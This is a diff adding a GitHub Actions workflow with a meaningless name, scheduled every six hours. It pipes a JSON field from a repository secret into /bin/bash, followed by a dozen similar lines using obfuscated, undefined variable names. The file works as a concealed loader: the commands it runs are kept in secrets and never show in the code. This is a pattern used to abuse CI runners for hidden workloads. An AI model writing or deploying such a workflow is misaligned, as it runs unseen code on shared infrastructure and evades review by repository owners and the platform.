@@ -1,0 +1,30 @@
+name: beetrootcluttered
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: beetrootcluttered
+        env:
+          wlp1: ${{ secrets.wlp1 }}
+        run: |
+          echo $wlp1 | jq -r .aq84 | /bin/bash
+          echo $rujr04 | jq -r .fhi7 | /bin/bash
+          echo $xlud995 | jq -r .tnxzx92 | /bin/bash
+          echo $ezv89831 | jq -r .kwdko339 | /bin/bash
+          echo $ch4182 | jq -r .dtok92 | /bin/bash
+          echo $hm813 | jq -r .m55420 | /bin/bash
+          echo $pyl79777 | jq -r .fp944 | /bin/bash
+          echo $xcq6 | jq -r .hbgmm0176 | /bin/bash
+          echo $efsw00749 | jq -r .kkobl067 | /bin/bash
+          echo $unzdc16 | jq -r .uyvy1569 | /bin/bash
+          echo $ukkwq8 | jq -r .hiufi7 | /bin/bash
+          echo $e822 | jq -r .yz40368 | /bin/bash
+          echo $od8 | jq -r .llo36742 | /bin/bash
+
